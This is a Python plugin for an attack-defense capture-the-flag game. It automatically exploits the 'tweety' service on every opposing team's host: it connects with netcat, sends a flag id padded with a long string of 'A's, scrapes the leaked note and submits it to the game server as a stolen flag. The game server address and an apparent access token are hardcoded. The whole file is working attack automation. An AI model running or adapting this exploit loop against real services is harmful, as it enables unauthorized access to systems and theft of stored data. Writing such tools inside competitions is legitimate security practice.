# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'tweety' service
def name():
    return "steal-tweety-flags"

def help():
    return "Steal flags from the 'tweety' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    import swpag_client
    from threading import Timer

    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    tweety_flags = t.get_targets(4)
    import sys

    for target in tweety_flags:
        team = target['hostname']
        flag_id = target['flag_id']

        if team in ["team9", "team11", "team12"]:
            print("Skipping {0}".format(team))
            continue

        try:
            print("Trying {0}...".format(team))
            p = Popen(["nc", team, "10004"], stdout=PIPE, stdin=PIPE)
            tt = Timer(3, p.kill)
            tt.start()

            p.stdout.readline().decode()
            p.stdout.readline().decode()
            p.stdout.readline().decode()
            p.stdin.write("R\n".encode())
            p.stdin.flush()
            p.stdout.readline().decode()
            p.stdin.write("{0} AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".format(flag_id).encode())
            p.stdin.flush()

            out = p.stdout.readline().decode()
            m = out.replace("Note content: ", '')
            m.strip()
            m.replace('\n', ' ').replace('\r', '')

            result = t.submit_flag([m[0:16]])

            
            print("Submitting flag {0} for team {1}: {2}".format(m[0:16], team, result))
            
        except:
            e = sys.exc_info()[0]
            print("Exception: {0}".format(e))